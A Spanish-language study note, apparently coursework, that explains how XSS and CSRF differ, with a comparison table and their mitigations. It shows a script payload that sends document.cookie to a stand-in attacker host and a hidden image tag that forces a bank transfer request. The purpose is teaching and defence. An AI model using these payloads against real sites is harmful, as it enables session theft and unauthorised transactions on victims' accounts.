# Objetivo 3: XSS vs CSRF

## 1. Lo que tienen en común

Tanto **XSS** como **CSRF** comparten dos características parecidas:
- Ambos se ejecutan **en el navegador de la víctima**, no directamente en el servidor del atacante.
- Ambos buscan, en última instancia, **que se realice una acción no deseada en la cuenta de la víctima** (cambiar su email, transferir dinero, publicar contenido, etc.).

Pero la mecánica de cómo logran es opuesta.

## La diferencia fundamental

| | XSS | CSRF |
|---|---|---|
| **Qué explota** | La falta de sanitización/escape de datos de entrada en la aplicación, que permite inyectar y ejecutar **código** | La **confianza del servidor en el navegador** del usuario, confiando en que toda petición que llega con la cookie de sesión válida fue iniciada intencionalmente por el usuario |
| **Qué logra el atacante** | Ejecutar **JavaScript arbitrario** en el contexto de origen (origin) del sitio vulnerable | Hacer que el navegador de la víctima **envíe una petición HTTP específica** (ya predefinida por el atacante) al sitio vulnerable |
| **Necesita que el atacante sepa el contenido de la respuesta** | Sí (puede leer el DOM, leer cookies no-HttpOnly, leer respuestas vía `fetch`/XHR) | No — es un ataque "a ciegas", el atacante nunca ve la respuesta de la petición que forzó |
| **Rol de las cookies de sesión** | Puede robarlas directamente (si no son HttpOnly) y reutilizarlas desde cualquier lugar | No las roba — se **aprovecha** de que el navegador las adjunta automáticamente a cada petición hacia ese dominio, sin que el atacante necesite conocerlas |
| **Dónde "vive" el payload malicioso** | Dentro del propio sitio vulnerable (reflejado en una respuesta, o guardado en la base de datos — Stored XSS) | En un sitio **externo**, controlado por el atacante (un email, una página maliciosa, un `<img>` en un foro) |
| **Mitigación principal** | Escapar/sanitizar toda salida dinámica insertada en el HTML (output encoding), Content Security Policy | Tokens anti-CSRF (uno por formulario/sesión, verificado en el servidor), y cookies con `SameSite=Strict` o `Lax` |

## Cómo funciona cada uno en la práctica

### XSS
El atacante logra que su **código JavaScript** se ejecute como si fuera parte legítima del sitio. Por ejemplo, inyectando en un campo vulnerable:
```html
<script>fetch('https://atacante.com/robo?c=' + document.cookie)</script>
```
Este script corre **dentro del origen (origin) del sitio vulnerable**, por lo que tiene acceso a todo lo que JavaScript puede ver ahí: el DOM de la página, cookies no protegidas con `HttpOnly`, el `localStorage`, y puede hacer peticiones autenticadas con `fetch`/`XHR` y **leer la respuesta**.

### CSRF
El atacante **no inyecta ningún código** en el sitio vulnerable — ni falta que le hace. En cambio, prepara en **su propio sitio** (o en un email) algo que dispare automáticamente una petición hacia el sitio víctima, por ejemplo:
```html
<img src="https://banco.com/transferir?cuenta=atacante&monto=5000" width="0" height="0">
```
o un formulario auto-enviado con JavaScript. Si la víctima, **estando logueada** en `banco.com` en ese mismo navegador, visita la página del atacante, el navegador agrega automáticamente la cookie de sesión de `banco.com` a esa petición (porque el navegador no distingue "quién" originó la petición, solo "a qué dominio va dirigida"), y el servidor de `banco.com`, al ver una cookie de sesión válida, procesa la transferencia como si la hubiera pedido el usuario legítimo. El atacante **nunca ve la respuesta** — ni falta que le hace, el objetivo ya se cumplió con solo forzar el envío de la petición.

## La diferencia conceptual en una frase

- **XSS** rompe la confianza de **la víctima en el sitio** (el sitio ejecuta código que no debería, confiando en que los datos que muestra son seguros).
- **CSRF** rompe la confianza de **el sitio en el navegador de la víctima** (el servidor confía en que cualquier petición que llegue con la cookie correcta fue intencional, sin verificar su origen real).

Por eso XSS es, en general, considerado más grave: con XSS el atacante puede **leer** cualquier cosa y ejecutar **cualquier** acción posible en la aplicación (incluyendo, de hecho, generar ataques CSRF "perfectos" desde dentro del propio sitio, evadiendo cualquier protección CSRF basada en origen). CSRF, en cambio, solo permite **disparar a ciegas** una acción puntual y predefinida, sin poder leer el resultado ni adaptarse dinámicamente.

## Conclusión

XSS y CSRF atacan dos eslabones distintos de la misma cadena de confianza navegador-servidor: XSS ataca la confianza que el navegador deposita en el contenido que el servidor le sirve (ejecutando código inyectado), mientras que CSRF ataca la confianza que el servidor deposita en las peticiones que recibe del navegador (asumiendo que toda petición con cookie válida es intencional). Entender esta diferencia es clave porque las mitigaciones son completamente distintas: sanitizar entradas/salidas no previene CSRF, y un token anti-CSRF no previene XSS.
